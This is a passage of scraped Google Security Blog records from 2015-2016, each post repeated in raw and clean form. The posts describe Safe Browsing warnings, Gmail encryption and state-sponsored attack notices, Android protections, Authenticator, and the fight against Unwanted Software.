Ads, Google Analytics, and more.    Safe Browsing already protects Gmail users by identifying potentially dangerous links in messages. Starting this week, Gmail users will begin to see warnings if they click these links, further extending this protection to different web browsers and email apps. The full-page warning will look like this:            Enhancing state-sponsored attack warnings      Since 2012 , we&#8217;ve warned Gmail users when we suspect they&#8217;ve been targeted by state-sponsored attackers:         These warnings are rare&#8212;fewer than 0.1% of users ever receive them&#8212;but they are critically important. The users that receive these warnings are often activists, journalists, and policy-makers taking bold stands around the world.    Today, we&#8217;re launching a new, full-page warning with instructions about how these users can stay safe. They may see these new warnings instead of, or in addition to, the existing ones.           The security of our users and their data is paramount. We&#8217;ll continue to build new protections, and work closely with the broader email ecosystem to support and improve standards such as TLS, that keep users safe.                                   Posted by Nicolas Lidzborski, Gmail Security Engineering Lead and Jonathan Pevarnek, Jigsaw Engineer  Today, we’re announcing a variety of new protections that will help keep Gmail users even safer and promote email security best practices across the Internet as a whole.  New tools and industry standards make email even safer  On Safer Internet Day this year, we introduced a new visual element to Gmail that lets users know when they’ve received a message that wasn’t delivered using encryption or if they’re composing a message to a recipient whose email service doesn’t support TLS encryption. It’s the red lock icon featured below:   This has had an immediate, positive effect on Gmail security. In the 44 days since we introduced it, the amount of inbound mail sent over an encrypted connection increased by 25%. We’re very encouraged by this progress! Given the relative ease of implementing encryption and its significant benefits for users, we expect to see this progress continue.  However, as our recent research with the University of Michigan and University of Illinois shows, misconfigured or malicious parts of the Internet can still tamper with email encryption. To help ensure TLS encryption works as intended, we’ve teamed-up with a variety of industry partners — including Comcast, Microsoft, and Yahoo!— to submit a draft IETF specification for “SMTP Strict Transport Security.” With this new proposed standard, companies can ensure that mail will only be delivered through encrypted channels, and that any encryption failures should be reported for further analysis, helping shine the spotlight on any malfeasance occurring around the Internet.  Safe Browsing makes Gmail more secure  Since 2007, Safe Browsing has protected users across the web by warning them before they visit dangerous sites known for phishing, malware, and Unwanted Software. Over the years, we’ve brought the protections afforded by Safe Browsing to other Google products as well, including: Chrome, Android, Ads, Google Analytics, and more.  Safe Browsing already protects Gmail users by identifying potentially dangerous links in messages. Starting this week, Gmail users will begin to see warnings if they click these links, further extending this protection to different web browsers and email apps. The full-page warning will look like this:    Enhancing state-sponsored attack warnings  Since 2012, we’ve warned Gmail users when we suspect they’ve been targeted by state-sponsored attackers:   These warnings are rare—fewer than 0.1% of users ever receive them—but they are critically important. The users that receive these warnings are often activists, journalists, and policy-makers taking bold stands around the world.  Today, we’re launching a new, full-page warning with instructions about how these users can stay safe. They may see these new warnings instead of, or in addition to, the existing ones.    The security of our users and their data is paramount. We’ll continue to build new protections, and work closely with the broader email ecosystem to support and improve standards such as TLS, that keep users safe.     ", "date": "March 24, 2016"},
{"website": "Google-Security", "title": "\nImprovements to Safe Browsing Alerts for Network Administrators\n", "author": ["Posted by Nav Jagpal, Software Engineer"], "link": "https://security.googleblog.com/2016/04/improvements-to-safe-browsing-alerts.html", "abstract": "                             Posted by Nav Jagpal, Software Engineer     We  launched  Safe Browsing Alerts for Network Administrators over 5 years ago. Just as Safe Browsing warns users about dangerous sites, this service sends notifications to network administrators when our systems detect harmful URLs on their networks.    We&#8217;ve made good progress:       22k ASNs are being monitored, or roughly 40% of active networks   1300 network administrators are actively using the tool   250 reports are sent daily to these administrators      Today, to provide Network Admins with even more useful information for protecting their users, we&#8217;re adding URLs related to Unwanted Software, Malicious Software, and Social Engineering to the set of information we share.              Here&#8217;s the full set of data we share with network administrators:        Compromised : Pages harming users through  drive-by-download  or exploits.    Distribution : Domains that are responsible for launching exploits and serving malware. Unlike compromised sites, which are often run by innocent webmasters, distribution domains are typically set up with the primary purpose of serving malicious content.    Social Engineering : Deceptive websites that trick users into performing unwanted actions such as downloading software or divulging private information. Social engineering includes phishing sites that trick users into revealing passwords.    Unwanted Software : URLs which lead to software that violates our  Unwanted Software Policy . This kind of software is often distributed through deceptive means such as social engineering, and has harmful software traits such as modifying users&#8217; browsing experience in unexpected ways and performing unwanted ad injections. You can learn more about Unwanted Software, or UwS,  here .    Malware Software : Traditional malware downloads, such as trojans and viruses.      Network administrators can use the data provided by our service to gain insights into the security and quality of their network. By working together, we can make it more challenging and expensive for attackers to profit from user harm.              If you&#8217;re a network administrator and haven&#8217;t yet registered your AS, you can do so  here . If you are experiencing problems verifying ownership, please  contact us .                                       Posted by Nav Jagpal, Software Engineer  We launched Safe Browsing Alerts for Network Administrators over 5 years ago. Just as Safe Browsing warns users about dangerous sites, this service sends notifications to network administrators when our systems detect harmful URLs on their networks.  We’ve made good progress:   22k ASNs are being monitored, or roughly 40% of active networks 1300 network administrators are actively using the tool 250 reports are sent daily to these administrators   Today, to provide Network Admins with even more useful information for protecting their users, we’re adding URLs related to Unwanted Software, Malicious Software, and Social Engineering to the set of information we share.      Here’s the full set of data we share with network administrators:   Compromised: Pages harming users through drive-by-download or exploits. Distribution: Domains that are responsible for launching exploits and serving malware. Unlike compromised sites, which are often run by innocent webmasters, distribution domains are typically set up with the primary purpose of serving malicious content. Social Engineering: Deceptive websites that trick users into performing unwanted actions such as downloading software or divulging private information. Social engineering includes phishing sites that trick users into revealing passwords. Unwanted Software: URLs which lead to software that violates our Unwanted Software Policy. This kind of software is often distributed through deceptive means such as social engineering, and has harmful software traits such as modifying users’ browsing experience in unexpected ways and performing unwanted ad injections. You can learn more about Unwanted Software, or UwS, here. Malware Software: Traditional malware downloads, such as trojans and viruses.   Network administrators can use the data provided by our service to gain insights into the security and quality of their network. By working together, we can make it more challenging and expensive for attackers to profit from user harm.      If you’re a network administrator and haven’t yet registered your AS, you can do so here. If you are experiencing problems verifying ownership, please contact us.      ", "date": "April 6, 2016"},
{"website": "Google-Security", "title": "\nNo More Deceptive Download Buttons\n", "author": ["Posted by Lucas Ballard, Safe Browsing Team"], "link": "https://security.googleblog.com/2016/02/no-more-deceptive-download-buttons.html", "abstract": "                             Posted by Lucas Ballard, Safe Browsing Team     In  November , we announced that Safe Browsing would protect you from social engineering attacks - deceptive tactics that try to trick you into doing something dangerous, like installing  unwanted software  or  revealing your personal information  (for example, passwords, phone numbers, or credit cards). You may have encountered social engineering in a deceptive download button, or an image ad that falsely claims your system is out of date. Today, we&#8217;re expanding Safe Browsing protection to protect you from such deceptive embedded content, like social engineering ads.         Consistent with the social engineering policy we announced in November, embedded content (like ads) on a web page will be considered social engineering when they either:       Pretend to act, or look and feel, like a trusted entity &#8212; like your own device or browser, or the website itself.&nbsp;   Try to trick you into doing something you&#8217;d only do for a trusted entity &#8212; like sharing a password or calling tech support.           Below are some examples of deceptive content, shown via ads:           This image claims that your software is out-of-date to trick you into clicking &#8220;update&#8221;.&nbsp;             This image mimics a dialogue from the FLV software developer -- but it does not actually originate from this developer.                These buttons seem like they will produce content that relate to the site (like a TV show or sports video stream) by mimicking the site&#8217;s look and feel. They are often not distinguishable from the rest of the page.         Our fight against unwanted software and social engineering is still just beginning. We'll continue to improve Google's  Safe Browsing  protection to help more people stay safe online.          Will my site be affected?          If visitors to your web site consistently see social engineering content, Google Safe Browsing may warn users when they visit the site. If your site is flagged for containing social engineering content, you should troubleshoot with Search Console. Check out our  social engineering help for webmasters .                                     Posted by Lucas Ballard, Safe Browsing Team  In November, we announced that Safe Browsing would protect you from social engineering attacks - deceptive tactics that try to trick you into doing something dangerous, like installing unwanted software or revealing your personal information (for example, passwords, phone numbers, or credit cards). You may have encountered social engineering in a deceptive download button, or an image ad that falsely claims your system is out of date. Today, we’re expanding Safe Browsing protection to protect you from such deceptive embedded content, like social engineering ads.   Consistent with the social engineering policy we announced in November, embedded content (like ads) on a web page will be considered social engineering when they either:   Pretend to act, or look and feel, like a trusted entity — like your own device or browser, or the website itself.  Try to trick you into doing something you’d only do for a trusted entity — like sharing a password or calling tech support.     Below are some examples of deceptive content, shown via ads:    This image claims that your software is out-of-date to trick you into clicking “update”.      This image mimics a dialogue from the FLV software developer -- but it does not actually originate from this developer.      These buttons seem like they will produce content that relate to the site (like a TV show or sports video stream) by mimicking the site’s look and feel. They are often not distinguishable from the rest of the page.    Our fight against unwanted software and social engineering is still just beginning. We'll continue to improve Google's Safe Browsing protection to help more people stay safe online.    Will my site be affected?    If visitors to your web site consistently see social engineering content, Google Safe Browsing may warn users when they visit the site. If your site is flagged for containing social engineering content, you should troubleshoot with Search Console. Check out our social engineering help for webmasters.     ", "date": "February 3, 2016"},
{"website": "Google-Security", "title": "\nBuilding a safer web, for everyone\n", "author": ["Posted by Gerhard Eschelbeck, VP, Security and Privacy"], "link": "https://security.googleblog.com/2016/02/building-safer-web-for-everyone.html", "abstract": "                             Posted by Gerhard Eschelbeck, VP, Security and Privacy      [Cross-posted from the  Official Google Blog ]     Today is  Safer Internet Day , a moment for technology companies, nonprofit organizations, security firms, and people around the world to focus on online safety, together. To mark the occasion, we&#8217;re rolling out new tools, and some useful reminders, to help protect you from online dangers of all stripes&#8212;phishing, malware, and other threats to your personal information.     1. Keeping security settings simple     The  Security Checkup  is a quick way to control the security settings for your Google Account. You can add a recovery phone number so we can help if you&#8217;re ever locked out of your account, strengthen your password settings, see which devices are connected to your account, and more. If you complete the Security Checkup by February 11, you&#8217;ll also get  2GB of extra Google Drive storage , which can be used across Google Drive, Gmail, and Photos.         Safer Internet Day is a great time to do it, but you can&#8212;and should!&#8212;take a Security Checkup on a regular basis. Start your Security Checkup by visiting  My Account .     2. Informing Gmail users about potentially unsafe messages     If you and your Grandpa both use Gmail to exchange messages, your connections are  encrypted  and  authenticated . That means no peering eyes can read those emails as they zoom across the web, and you can be confident that the message from your Grandpa in size 48 font (with no punctuation and a few misspellings) is really from him!    However, as our  Safer Email Transparency Report  explains, these things are not always true when Gmail interacts with other mail services. Today, we&#8217;re introducing changes in Gmail on the web to let people know when a received message was not encrypted, if you&#8217;re composing a message to a recipient whose email service doesn&#8217;t support  TLS encryption , or when the sender&#8217;s domain couldn&#8217;t be authenticated.    Here&#8217;s the notice you&#8217;ll see in Gmail before you send a message to a service that doesn&#8217;t support TLS encryption. You&#8217;ll also see the broken lock icon if you receive a message that was sent without TLS encryption.         If you receive a message that can&#8217;t be authenticated, you&#8217;ll see a question mark where you might otherwise see a profile photo or logo:              3. Protecting you from bad apps     Dangerous apps that phish and steal your personal information, or hold your phone hostage and make you pay to unlock it, have no place on your smartphone&#8212;or any device, for that matter.    Google Play helps protect your Android device by rejecting bad apps that don&#8217;t comply with our  Play policies . It also conducts more than 200 million daily security scans of devices, in tandem with our  Safe Browsing  system, for any signs of trouble. Last year, bad apps were installed on fewer than 0.13% of Android devices that install apps only from Google Play.    Learn more about these, and other Android security features &#8212; like app sandboxing,  monthly security updates  for Nexus and other devices, and our  Security Rewards Program &#8212;in new research we&#8217;ve made public on our  Android blog .     4. Busting bad advertising practices     Malicious advertising &#8220;botnets&#8221; try to send phony visitors to websites to make money from online ads. Botnets threaten the businesses of honest advertisers and publishers, and because they&#8217;re often made up of devices infected with malware, they put users in harm&#8217;s way too.    We've worked to keep botnets out of our ads systems, cutting them out of advertising revenue, and making it harder to make money from distributing malware and  Unwanted Software . Now, as part of our effort to  fight bad ads online , we&#8217;re reinforcing our existing botnet defenses by automatically filtering traffic from three of the top ad fraud botnets, comprising more than 500,000 infected user machines. Learn more about this update on the  Doubleclick blog .     5. Moving the security conversation forward     Recent events&#8212; Edward Snowden&#8217;s disclosures , the  Sony Hack , the  current conversation around encryption , and more&#8212;have made online safety a truly mainstream issue. This is reflected both in news headlines, and popular culture: &#8220; Mr. Robot ,&#8221; a TV series about hacking and cybersecurity, just won a Golden Globe for Best Drama, and  @SwiftOnSecurity , a popular security commentator, is named after Taylor Swift.    But despite this shift, security remains a complex topic that lends itself to lively debates between experts...that are often unintelligible to just about everyone else. We need to simplify the way we talk about online security to enable everyone to understand its importance and participate in this conversation.    To that end, we&#8217;re teaming up with  Medium  to host a virtual roundtable about online security, present and future. Moderated by journalist and security researcher  Kevin Poulsen , this project aims to present fresh perspectives about online security in a time when our attention is increasingly ruled by the devices we carry with us constantly. We hope you&#8217;ll  tune in  and check it out.    Online security and safety are being discussed more often, and with more urgency, than ever before. We hope you&#8217;ll take a few minutes today to learn how Google protects your data and how we can work toward a safer web, for everyone.                                   Posted by Gerhard Eschelbeck, VP, Security and Privacy  [Cross-posted from the Official Google Blog]  Today is Safer Internet Day, a moment for technology companies, nonprofit organizations, security firms, and people around the world to focus on online safety, together. To mark the occasion, we’re rolling out new tools, and some useful reminders, to help protect you from online dangers of all stripes—phishing, malware, and other threats to your personal information.  1. Keeping security settings simple  The Security Checkup is a quick way to control the security settings for your Google Account. You can add a recovery phone number so we can help if you’re ever locked out of your account, strengthen your password settings, see which devices are connected to your account, and more. If you complete the Security Checkup by February 11, you’ll also get 2GB of extra Google Drive storage, which can be used across Google Drive, Gmail, and Photos.   Safer Internet Day is a great time to do it, but you can—and should!—take a Security Checkup on a regular basis. Start your Security Checkup by visiting My Account.  2. Informing Gmail users about potentially unsafe messages  If you and your Grandpa both use Gmail to exchange messages, your connections are encrypted and authenticated. That means no peering eyes can read those emails as they zoom across the web, and you can be confident that the message from your Grandpa in size 48 font (with no punctuation and a few misspellings) is really from him!  However, as our Safer Email Transparency Report explains, these things are not always true when Gmail interacts with other mail services. Today, we’re introducing changes in Gmail on the web to let people know when a received message was not encrypted, if you’re composing a message to a recipient whose email service doesn’t support TLS encryption, or when the sender’s domain couldn’t be authenticated.  Here’s the notice you’ll see in Gmail before you send a message to a service that doesn’t support TLS encryption. You’ll also see the broken lock icon if you receive a message that was sent without TLS encryption.   If you receive a message that can’t be authenticated, you’ll see a question mark where you might otherwise see a profile photo or logo:     3. Protecting you from bad apps  Dangerous apps that phish and steal your personal information, or hold your phone hostage and make you pay to unlock it, have no place on your smartphone—or any device, for that matter.  Google Play helps protect your Android device by rejecting bad apps that don’t comply with our Play policies. It also conducts more than 200 million daily security scans of devices, in tandem with our Safe Browsing system, for any signs of trouble. Last year, bad apps were installed on fewer than 0.13% of Android devices that install apps only from Google Play.  Learn more about these, and other Android security features — like app sandboxing, monthly security updates for Nexus and other devices, and our Security Rewards Program—in new research we’ve made public on our Android blog.  4. Busting bad advertising practices  Malicious advertising “botnets” try to send phony visitors to websites to make money from online ads. Botnets threaten the businesses of honest advertisers and publishers, and because they’re often made up of devices infected with malware, they put users in harm’s way too.  We've worked to keep botnets out of our ads systems, cutting them out of advertising revenue, and making it harder to make money from distributing malware and Unwanted Software. Now, as part of our effort to fight bad ads online, we’re reinforcing our existing botnet defenses by automatically filtering traffic from three of the top ad fraud botnets, comprising more than 500,000 infected user machines. Learn more about this update on the Doubleclick blog.  5. Moving the security conversation forward  Recent events—Edward Snowden’s disclosures, the Sony Hack, the current conversation around encryption, and more—have made online safety a truly mainstream issue. This is reflected both in news headlines, and popular culture: “Mr. Robot,” a TV series about hacking and cybersecurity, just won a Golden Globe for Best Drama, and @SwiftOnSecurity, a popular security commentator, is named after Taylor Swift.  But despite this shift, security remains a complex topic that lends itself to lively debates between experts...that are often unintelligible to just about everyone else. We need to simplify the way we talk about online security to enable everyone to understand its importance and participate in this conversation.  To that end, we’re teaming up with Medium to host a virtual roundtable about online security, present and future. Moderated by journalist and security researcher Kevin Poulsen, this project aims to present fresh perspectives about online security in a time when our attention is increasingly ruled by the devices we carry with us constantly. We hope you’ll tune in and check it out.  Online security and safety are being discussed more often, and with more urgency, than ever before. We hope you’ll take a few minutes today to learn how Google protects your data and how we can work toward a safer web, for everyone.     ", "date": "February 9, 2016"},
{"website": "Google-Security", "title": "\nProtecting hundreds of millions more mobile users\n", "author": ["Posted by Noé Lutz, Nathan Parker, Stephan Somogyi; Google Chrome and Safe Browsing Teams"], "link": "https://security.googleblog.com/2015/12/protecting-hundreds-of-millions-more.html", "abstract": "                             Posted by Noé Lutz, Nathan Parker, Stephan Somogyi; Google Chrome and Safe Browsing Teams         Google Safe Browsing has been protecting well over a billion desktop users against  malware, unwanted software, and social engineering sites  on the web for years. Today, we&#8217;re pleased to announce that we&#8217;ve extended our protective umbrella to hundreds of millions of Chrome users on Android.     How To Get It       If you&#8217;re an Android user, you probably already have it! This new Safe Browsing client on Android is part of Google Play Services, starting with version 8.1. The first app to use it is Chrome, starting with version 46&#8212;we&#8217;re now protecting all Android Chrome users by default. If you look at Chrome&#8217;s Settings &gt; Privacy menu, you can verify that Safe Browsing is enabled and that you&#8217;re protected. Chrome warns you about dangerous sites as shown below. It does this&nbsp; while preserving your privacy, just like on desktop .     What Came Before       The Android platform and the Play Store have long had protection against potentially harmful apps. And as our adversaries have improved their skills in trying to evade us, we&#8217;ve improved our detection, keeping Android app users safe. But not all dangers to mobile users come from apps.     What&#8217;s New           Social engineering &#8212;and phishing in particular&#8212;requires different protection; we need to keep an up-to-date list of bad sites on the device to make sure we can warn people before they browse into a trap. Providing this protection on a mobile device is much more difficult than on a desktop system, in no small part because we have to make sure that list doesn&#8217;t get stale, yet:       Mobile data costs money for most users around the world. Data size matters a lot.   Mobile data speeds are slower than Wi-Fi in much of the world. Data size matters a lot.   Cellular connectivity quality is much more uneven, so getting the right data to the device quickly is critically important. Data size matters a lot.       Maximum Protection Per Bit       Bytes are big: our mantra is that every single bit that Safe Browsing sends a mobile device must improve protection. Network bandwidth and battery are the scarcest resources on a mobile device, so we had to carefully rethink how to best protect mobile users. Some social engineering attacks only happen in certain parts of the world, so we only send information that protects devices in the geographic regions they&#8217;re in.    We also make sure that we send information about the riskiest sites first: if we can only get a very short update through, as is often the case on lower-speed networks in emerging economies, the update really has to count. We also worked with Google&#8217;s compression team to make the little data that we do send as small as possible.    Together with the Android Security team, we made the software on the device extra stingy with memory and processor use, and careful about minimizing network traffic. All of these details matter to us; we must not waste our users&#8217; data plans, or a single moment of their battery life.     More Mobile     We hunt badness on the Internet so that you don&#8217;t discover it the hard way, and our protection should never be an undue burden on your networking costs or your device&#8217;s battery. As more of the world relies on the mobile web, we want to make sure you&#8217;re as safe as can be, as efficiently as possible.                                        Posted by Noé Lutz, Nathan Parker, Stephan Somogyi; Google Chrome and Safe Browsing Teams     Google Safe Browsing has been protecting well over a billion desktop users against malware, unwanted software, and social engineering sites on the web for years. Today, we’re pleased to announce that we’ve extended our protective umbrella to hundreds of millions of Chrome users on Android.  How To Get It  If you’re an Android user, you probably already have it! This new Safe Browsing client on Android is part of Google Play Services, starting with version 8.1. The first app to use it is Chrome, starting with version 46—we’re now protecting all Android Chrome users by default. If you look at Chrome’s Settings > Privacy menu, you can verify that Safe Browsing is enabled and that you’re protected. Chrome warns you about dangerous sites as shown below. It does this while preserving your privacy, just like on desktop.  What Came Before  The Android platform and the Play Store have long had protection against potentially harmful apps. And as our adversaries have improved their skills in trying to evade us, we’ve improved our detection, keeping Android app users safe. But not all dangers to mobile users come from apps.  What’s New   Social engineering—and phishing in particular—requires different protection; we need to keep an up-to-date list of bad sites on the device to make sure we can warn people before they browse into a trap. Providing this protection on a mobile device is much more difficult than on a desktop system, in no small part because we have to make sure that list doesn’t get stale, yet:   Mobile data costs money for most users around the world. Data size matters a lot. Mobile data speeds are slower than Wi-Fi in much of the world. Data size matters a lot. Cellular connectivity quality is much more uneven, so getting the right data to the device quickly is critically important. Data size matters a lot.   Maximum Protection Per Bit  Bytes are big: our mantra is that every single bit that Safe Browsing sends a mobile device must improve protection. Network bandwidth and battery are the scarcest resources on a mobile device, so we had to carefully rethink how to best protect mobile users. Some social engineering attacks only happen in certain parts of the world, so we only send information that protects devices in the geographic regions they’re in.  We also make sure that we send information about the riskiest sites first: if we can only get a very short update through, as is often the case on lower-speed networks in emerging economies, the update really has to count. We also worked with Google’s compression team to make the little data that we do send as small as possible.  Together with the Android Security team, we made the software on the device extra stingy with memory and processor use, and careful about minimizing network traffic. All of these details matter to us; we must not waste our users’ data plans, or a single moment of their battery life.  More Mobile  We hunt badness on the Internet so that you don’t discover it the hard way, and our protection should never be an undue burden on your networking costs or your device’s battery. As more of the world relies on the mobile web, we want to make sure you’re as safe as can be, as efficiently as possible.       ", "date": "December 7, 2015"},
{"website": "Google-Security", "title": "\nA new version of Authenticator for Android\n", "author": ["Posted by Alexei Czeskis, Software Engineer"], "link": "https://security.googleblog.com/2015/12/a-new-version-of-authenticator-for.html", "abstract": "                             Posted by Alexei Czeskis, Software Engineer     Authenticator for Android is used by millions of users and, combined with  2-Step Verification , it provides an extra layer of protection for Google Accounts.    Our latest version has some cool new features. You will notice a new icon and a refreshed design. There's also support for  Android Wear  devices, so you'll be able to get verification codes from compatible devices, like your watch.            The new Authenticator also comes with a developer preview of support for NFC Security Key, based on the FIDO Universal 2nd Factor (U2F) protocol via NFC. Play Store will prompt for the NFC permission before you install this version of Authenticator.    Developers who want to learn more about U2F can refer to FIDO's  specifications . Additionally, you can try it out at  https://u2fdemo.appspot.com . Note that you'll need an Android device running the latest versions of Google Chrome and Authenticator and also a  Security Key  with NFC support.    You can find the latest  Authenticator for Android on the Play Store .                                   Posted by Alexei Czeskis, Software Engineer  Authenticator for Android is used by millions of users and, combined with 2-Step Verification, it provides an extra layer of protection for Google Accounts.  Our latest version has some cool new features. You will notice a new icon and a refreshed design. There's also support for Android Wear devices, so you'll be able to get verification codes from compatible devices, like your watch.   The new Authenticator also comes with a developer preview of support for NFC Security Key, based on the FIDO Universal 2nd Factor (U2F) protocol via NFC. Play Store will prompt for the NFC permission before you install this version of Authenticator.  Developers who want to learn more about U2F can refer to FIDO's specifications. Additionally, you can try it out at https://u2fdemo.appspot.com. Note that you'll need an Android device running the latest versions of Google Chrome and Authenticator and also a Security Key with NFC support.  You can find the latest Authenticator for Android on the Play Store.     ", "date": "December 7, 2015"},
{"website": "Google-Security", "title": "\nYear one: progress in the fight against Unwanted Software\n", "author": ["Posted by Moheeb Abu Rajab, Google Security Team"], "link": "https://security.googleblog.com/2015/12/year-one-progress-in-fight-against.html", "abstract": "                             Posted by Moheeb Abu Rajab, Google Security Team        &#8220;At least 2 or 3 times a week I get a big blue warning screen with a loud voice telling me that I&#8217;ve a virus and to call the number at the end of the big blue warning.&#8221;    &#8220;I&#8217;m covered with ads and unwanted interruptions. what&#8217;s the fix?&#8221;    &#8220;I WORK FROM HOME AND THIS POPING [sic] UP AND RUNNING ALL OVER MY COMPUTER IS NOT RESPECTFUL AT ALL THANK YOU.&#8221;        Launched in 2007 , Safe Browsing has long helped protect people across the web from well-known online dangers like phishing and malware. More recently, however, we&#8217;ve seen an increase in user complaints like the ones above. These issues and others&#8212;hijacked browser settings, software installed without users' permission that resists attempts to uninstall&#8212;have signaled the rise of a new type of malware that our systems haven&#8217;t been able to reliably detect.     More than a year ago , we began a broad fight against this category of badness that we now call &#8220;Unwanted Software&#8221;, or &#8220;UwS&#8221; (pronounced &#8220;ooze&#8221;). Today, we wanted to share some progress and outline the work that must happen in order to continue protecting users across the web.     What is UwS and how does it get on my computer?     In order to combat UwS, we first needed to define it. Despite lots of variety, our research enabled us to develop a  defining list of characteristics  that this type of software often displays:       It is deceptive, promising a value proposition that it does not meet.   It tries to trick users into installing it or it piggybacks on the installation of another program.   It doesn&#8217;t tell the user about all of its principal and significant functions.   It affects the user&#8217;s system in unexpected ways.   It is difficult to remove.   It collects or transmits private information without the user&#8217;s knowledge.   It is bundled with other software and its presence is not disclosed.           Next, we had to better understand how UwS is being disseminated.         This varies quite a bit, but time and again, deception is at the heart of these tactics. Common UwS distribution tactics include:  unwanted ad injection , misleading ads such as &#8220;trick-to-click&#8221;, ads disguised as &#8216;download&#8217; or &#8216;play&#8217; buttons, bad software downloader practices, misleading or missing disclosures about what the software does, hijacked browser default settings, annoying system pop-up messages, and more.         Here are a few specific examples:            Deceptive ads leading to UwS downloads             Ads from unwanted ads injector taking over a New York Times page and sending the user to phone scams             Unwanted ad injector inserts ads on the Google search results page             New tab page is overridden by UwS             UwS hijacks Chrome navigations and directs users to a scam tech support website           One year of progress          Because UwS touches so many different parts of people&#8217;s online experiences, we&#8217;ve worked to fight it on many different fronts. Weaving UwS detection into Safe Browsing has been critical to this work, and we&#8217;ve pursued other efforts as well&#8212;here&#8217;s an overview:       We now include UwS in  Safe Browsing  and its  API , enabling people who use Chrome and other browsers to see warnings before they go to sites that contain UwS. The red warning below appears in Chrome.              We launched the  Chrome Cleanup Tool , a one-shot UwS removal tool that has helped clean more than 40 million devices. We shed more light on a common symptom of UwS&#8212; unwanted ad injectors . We outlined  how they make money  and  launched a new filter  in DoubleClick Bid Manager that removes impressions generated by unwanted ad injectors before bids are made.   We started using  UwS as a signal in search  to reduce the likelihood that sites with UwS would appear in search results.   We started  disabling  Google ads that lead to sites with UwS downloads.           It&#8217;s still early, but these changes have already begun to move the needle.       UwS-related Chrome user complaints have fallen. Last year, before we rolled-out our new policies, these were 40% of total complaints and now they&#8217;re 20%.   We&#8217;re now showing more than 5 million Safe Browsing warnings per day on Chrome related to UwS to ensure users are aware of a site&#8217;s potential risks.   We helped more than 14 million users remove over 190 deceptive Chrome extensions from their devices.   We  reduced the number of UwS warnings  that users see via AdWords by 95%, compared to last year. Even prior to last year, less than 1% of UwS downloads were due to AdWords.         However, there is still a long way to go. 20% of all feedback from Chrome users is related to UwS and we believe 1 in 10 Chrome users have hijacked settings or unwanted ad injectors on their machines. We expect users of other browsers continue to suffer from similar issues; there is lots of work still to be done.            Looking ahead: broad industry participation is essential          Given the complexity of the UwS ecosystem, the involvement of players across the industry is key to making meaningful progress in this fight. This chain is only as strong as its weakest links: everyone must work to develop and enforce strict, clear policies related to major sources of UwS.         If we&#8217;re able, as an industry, to enforce these policies, then everyone will be able to provide better experiences for their users. With this in mind, we&#8217;re very pleased to see that the  FTC recently warned consumers  about UwS and characterizes UwS as a  form of malware . This is an important step toward uniting the online community and focusing good actors on the common goal of eliminating UwS.         We&#8217;re still in the earliest stages of the fight against UwS, but we&#8217;re moving in the right direction. We&#8217;ll continue our efforts to protect users from UwS and work across the industry to eliminate these bad practices.                                          Posted by Moheeb Abu Rajab, Google Security Team  “At least 2 or 3 times a week I get a big blue warning screen with a loud voice telling me that I’ve a virus and to call the number at the end of the big blue warning.” “I’m covered with ads and unwanted interruptions. what’s the fix?” “I WORK FROM HOME AND THIS POPING [sic] UP AND RUNNING ALL OVER MY COMPUTER IS NOT RESPECTFUL AT ALL THANK YOU.”  Launched in 2007, Safe Browsing has long helped protect people across the web from well-known online dangers like phishing and malware. More recently, however, we’ve seen an increase in user complaints like the ones above. These issues and others—hijacked browser settings, software installed without users' permission that resists attempts to uninstall—have signaled the rise of a new type of malware that our systems haven’t been able to reliably detect.  More than a year ago, we began a broad fight against this category of badness that we now call “Unwanted Software”, or “UwS” (pronounced “ooze”). Today, we wanted to share some progress and outline the work that must happen in order to continue protecting users across the web.  What is UwS and how does it get on my computer?  In order to combat UwS, we first needed to define it. Despite lots of variety, our research enabled us to develop a defining list of characteristics that this type of software often displays:   It is deceptive, promising a value proposition that it does not meet. It tries to trick users into installing it or it piggybacks on the installation of another program. It doesn’t tell the user about all of its principal and significant functions. It affects the user’s system in unexpected ways. It is difficult to remove. It collects or transmits private information without the user’s knowledge. It is bundled with other software and its presence is not disclosed.     Next, we had to better understand how UwS is being disseminated.    This varies quite a bit, but time and again, deception is at the heart of these tactics. Common UwS distribution tactics include: unwanted ad injection, misleading ads such as “trick-to-click”, ads disguised as ‘download’ or ‘play’ buttons, bad software downloader practices, misleading or missing disclosures about what the software does, hijacked browser default settings, annoying system pop-up messages, and more.    Here are a few specific examples:    Deceptive ads leading to UwS downloads    Ads from unwanted ads injector taking over a New York Times page and sending the user to phone scams    Unwanted ad injector inserts ads on the Google search results page    New tab page is overridden by UwS    UwS hijacks Chrome navigations and directs users to a scam tech support website    One year of progress    Because UwS touches so many different parts of people’s online experiences, we’ve worked to fight it on many different fronts. Weaving UwS detection into Safe Browsing has been critical to this work, and we’ve pursued other efforts as well—here’s an overview:   We now include UwS in Safe Browsing and its API, enabling people who use Chrome and other browsers to see warnings before they go to sites that contain UwS. The red warning below appears in Chrome.     We launched the Chrome Cleanup Tool, a one-shot UwS removal tool that has helped clean more than 40 million devices. We shed more light on a common symptom of UwS—unwanted ad injectors. We outlined how they make money and launched a new filter in DoubleClick Bid Manager that removes impressions generated by unwanted ad injectors before bids are made. We started using UwS as a signal in search to reduce the likelihood that sites with UwS would appear in search results. We started disabling Google ads that lead to sites with UwS downloads.     It’s still early, but these changes have already begun to move the needle.   UwS-related Chrome user complaints have fallen. Last year, before we rolled-out our new policies, these were 40% of total complaints and now they’re 20%. We’re now showing more than 5 million Safe Browsing warnings per day on Chrome related to UwS to ensure users are aware of a site’s potential risks. We helped more than 14 million users remove over 190 deceptive Chrome extensions from their devices. We reduced the number of UwS warnings that users see via AdWords by 95%, compared to last year. Even prior to last year, less than 1% of UwS downloads were due to AdWords.    However, there is still a long way to go. 20% of all feedback from Chrome users is related to UwS and we believe 1 in 10 Chrome users have hijacked settings or unwanted ad injectors on their machines. We expect users of other browsers continue to suffer from similar issues; there is lots of work still to be done.     Looking ahead: broad industry participation is essential    Given the complexity of the UwS ecosystem, the involvement of players across the industry is key to making meaningful progress in this fight. This chain is only as strong as its weakest links: everyone must work to develop and enforce strict, clear policies related to major sources of UwS.    If we’re able, as an industry, to enforce these policies, then everyone will be able to provide better experiences for their users. With this in mind, we’re very pleased to see that the FTC recently warned consumers about UwS and characterizes UwS as a form of malware. This is an important step toward uniting the online community and focusing good actors on the common goal of eliminating UwS.    We’re still in the earliest stages of the fight against UwS, but we’re moving in the right direction. We’ll continue our efforts to protect users from UwS and work across the industry to eliminate these bad practices.       ", "date": "December 9, 2015"},
